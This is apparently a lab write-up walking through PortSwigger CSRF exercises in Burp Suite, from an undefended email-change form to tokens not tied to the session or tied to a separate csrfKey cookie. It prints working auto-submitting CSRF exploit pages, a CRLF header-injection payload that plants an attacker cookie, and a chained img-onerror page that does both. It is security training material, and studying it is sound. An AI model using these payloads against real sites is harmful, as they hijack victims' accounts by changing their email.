______________

# CSRF vulnerability with no defenses

For this exercise, we are going to work with the option offered by the page to change the email, which is vulnerable to CSRF. For this PortSwigger exercise, we will use Burp Suite to capture the request.

<img width="742" height="309" alt="Captura de pantalla 2026-03-07 015455" src="https://github.com/user-attachments/assets/6d69b4f2-7f2d-4e5b-9491-54b4008cd42a" />


Understanding how CSRF works is key; for this, an HTML format must be sent, which is the "Trojan Horse" containing the exploit. Let's understand how it works and the components it requires to be effective.

```
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 

email=wiener@normal-user.com
```

These 5 components are the key:

```
POST /my-account/change-email HTTP/2
Host: 0aaa00db04df4d0a81c317240011001b.web-security-academy.net
Cookie: session=W35jeDwQNQSomVLqAlPQhGkES8Ny2NRR
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

email=test%40prueba1.net
```

With the necessary data collected, we now need to develop the HTML exploit to send it from the server provided by PortSwigger.

<img width="1811" height="709" alt="Captura de pantalla 2026-03-07 030655" src="https://github.com/user-attachments/assets/a3a07109-3589-4811-9120-571b38664677" />

There are various tools to perform this work, such as the premium version of Burp Suite; in these cases, we are going to use a free tool: **CSRF Simple PoC Generator**.

```
<html>
	<body>
		<form method="POST" action="https://0aaa00db04df4d0a81c317240011001b.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="test%40prueba1.net"/>
			<input type="submit" value="Submit">
		</form>
		<script>
		    document.forms[0].submit();
		</script>
	</body>
</html>
```

This is our exploit. The following code is used because, without it, our exploit would have a submit button that the victim would have to click to execute the exploit, which is not smart or productive as pentesters. By using this addition, we make the exploit execute automatically without the victim needing to press the button.

```
<script>
    document.forms[0].submit();
</script>
```

**document.forms**

- It is a collection (`HTMLCollection`) of all the forms (`<form>`) on the page.
- It is indexed like an array: `forms[0]` is the **first form**, `forms[1]` the second, etc.

**.submit()**
- It is a method of the `<form>` elements that **triggers the submission of the form** to the server.

<img width="1132" height="756" alt="Captura de pantalla 2026-03-07 030314" src="https://github.com/user-attachments/assets/95de0bd7-6467-4a64-91e7-a98db3f5db7c" />

It is worth noting that sometimes as a form of protection (it is somewhat outdated), pages implement the change of request from POST to GET or vice versa, which forces us to change the request to make the changes we want.

<img width="730" height="442" alt="Captura de pantalla 2026-03-07 202755" src="https://github.com/user-attachments/assets/9c08ca30-dcd6-4d94-be88-0e1cf0d05f68" />

We see that it is using POST and that the CSRF Token is present, which serves as protection to avoid requests under that method; because of that, we are going to change the request type. CSRF (Cross-Site Request Forgery) tokens serve a single critical purpose: to guarantee that the action the server is executing was voluntarily initiated by the user within the application itself, and not through deception from another website.

<img width="724" height="59" alt="Captura de pantalla 2026-03-07 203134" src="https://github.com/user-attachments/assets/90bb51c4-396e-4c8b-897c-ea6674e715f8" />

When we change the method, we see the format change. To perform a CSRF correctly, we must remove the CSRF token (we won't need it).

<img width="487" height="19" alt="Pasted image 20260307203552" src="https://github.com/user-attachments/assets/424144e2-7669-4806-ae35-9c6bf7c181b1" />

With this method, we can successfully change the email.

```
<html>
  <body>
    <form action="https://0a5300890385f76d806d038100020025.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="test@prueba9.net">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**HTML form (exploit)**

It is also worth noting the order of the variables:

```
<form method="GET" action="https://0ad4007904211b0b8026da940098001f.web-security-academy.net/my-account/change-email">
```

This can work when an action-method does not work. We use CSRF Simple PoC Generator for this. 

__________________

- Another situation we might encounter is one in which the CSRF token is not linked to the user's session. To develop this exercise, we will use the credentials given by Tryhackme:

```
wiener:peter
carlos:montoya
```

We are going to capture the email change request with the user Wiener (victim) using Burp Suite.

<img width="622" height="543" alt="Captura de pantalla 2026-03-08 200011" src="https://github.com/user-attachments/assets/28809776-61ce-47bf-9098-5502140112b4" />

Then we will log in incognito as Carlos (Attacker) and capture his CSRF Token.

<img width="744" height="730" alt="Captura de pantalla 2026-03-08 193634" src="https://github.com/user-attachments/assets/40aaf35e-352e-4607-a2eb-d02346a4bd0c" />

With this done, we are going to change Wiener's CSRF Token for Carlos's and send the request; if it is successful, it would confirm that the CSRF token is not linked to the user session.

<img width="495" height="496" alt="Captura de pantalla 2026-03-08 193907" src="https://github.com/user-attachments/assets/17d6e4fb-5a95-44f0-9935-04c9db73b847" />

It was successful, it is vulnerable. With this done, we would already have an attack vector; we are going to create an HTML form to change the email from the victim account to our attacker account as user Carlos (which could trigger a deeper attack, such as stealing passwords).

```
<html>
	<body>
		<form action="https://0aaf006803539410814b16a900a50098.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="testeafxxf@hotmail.com"/>
			<input type="hidden" name="csrf" value="WUANglopHbpQAK34NQa5LPfPmmWfLsR6"/>
		</form>
        <script>
		    document.forms[0].submit();
		</script>
	</body>
</html>
```

For this HTML form, we have to refresh our attacker page and use the new CSRF token since this page uses the rotating CSRF Token type, which changes it with each request or by refreshing the page. As a small addition, we also change `%40` for `@` because, depending on the configuration of each server, it may or may not cause problems.

<img width="934" height="755" alt="Captura de pantalla 2026-03-08 195339" src="https://github.com/user-attachments/assets/1612a79c-dcf4-4831-98ff-387dab847709" />

And it works correctly. The implications of this simple exercise highlight how poor sanitization of CSRF Tokens allows us as attackers to make changes that can deeply affect security. 

_________________

- Another security measure that can be vulnerable is the habit of linking a CSRF token to the Cookie but not to the regular session cookie; rather, it is linked to a second cookie. This happens when two frameworks are used, one for session management and the other for CSRF protection. This protection measure can be bypassed by understanding the behavior between the CSRF token and the CSRF Key.

First, let's see how this security measure behaves; for this, we will capture the request with Burp Suite.

<img width="663" height="456" alt="Captura de pantalla 2026-03-09 152535" src="https://github.com/user-attachments/assets/bd5ea514-5e32-4a85-8edf-e98f888170b3" />

Seeing that a CSRF token and a CSRF Key are used, we will log in with our attacker account and extract these same values to substitute them for the victim's and see if it accepts them as valid.

<img width="785" height="56" alt="Captura de pantalla 2026-03-09 152921" src="https://github.com/user-attachments/assets/a6fe329a-e4c8-4e5c-8f8c-7a1e1addb23c" />

<img width="811" height="43" alt="Captura de pantalla 2026-03-09 152950" src="https://github.com/user-attachments/assets/eb9ff5fb-a587-4a53-acb4-b0a8f35c4376" />

<img width="1186" height="425" alt="Captura de pantalla 2026-03-09 153221" src="https://github.com/user-attachments/assets/53806355-65c9-4a0c-aa08-d55cb031805f" />

We see that the victim machine correctly accepted the values from our attacker machine; with this known, we confirm that we have an attack vector. Since the execution of an exploit in this situation requires having a valid `csrfKey` cookie, we will use an **HTTP header injection** on the victim machine, placing our attacker `csrfKey` there. We will use the following script to test if it is possible to inject the `csrfKey`:

`IP/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKERCSRFKEY%3b%20SameSite=None`

`Set-Cookie: csrfKey=YOUR-KEY; SameSite=None` serves as an HTTP header that attempts to set a cookie in the user's browser.

`SameSite=None` tells the browser that **it must include the cookie in all HTTP requests**, even if they are made from a different domain than the one that set the cookie. The previous script is applied to the search function of the page, which is vulnerable.

<img width="1237" height="60" alt="Captura de pantalla 2026-03-09 153637" src="https://github.com/user-attachments/assets/82e57b50-829e-40ef-8896-bbc1528a816b" />

Testing it in Burp Suite confirms with a 200 status that the HTTP header injection worked correctly; with this, we are now going to design an HTML form with two functions: injecting the attacker CSRF cookie and using the attacker CSRF token to change the email.

```
<html>
	<body>
		<form action="https://0ac800f604cd43e7806ab7a000a400a2.web-security-academy.net/my-account/change-email" method="POST" id="CsrF-FORM" target="csrf-iframe">
			<input type="hidden" name="email" value="Vamos@hotmai.com"/>
			<input type="hidden" name="csrf" value="NDGRxCb1u6FL172EhDP8PUJ9LG1IVLYt"/>
			<input type="submit" value="Submit">
		</form>
		<img src="https://0ac800f604cd43e7806ab7a000a400a2.web-security-academy.net/?search=hol444%0d%0aSet-Cookie:%20csrfKey=GLchf6CDuXN0nNYXOjIpp4RlbY0ZwcVY%3b%20SameSite=None" onerror="document.forms[0].submit();">
	</body>
</html>
```

**HTML form**

We enter the `csrfKey` through an XSS with an `img` tag and an `onerror` event to trigger immediate execution via `document.forms[0].submit();` so as not to depend on the submit button.

<img width="936" height="775" alt="Captura de pantalla 2026-03-09 190853" src="https://github.com/user-attachments/assets/f08a360c-fcbe-44a1-a15f-47faedac6e9c" />

In this exercise, we can highlight how 3 types of vulnerabilities are chained (CSRF, XSS, HTTP injection) and work together, giving us a notion of how a phishing attack works in real life.
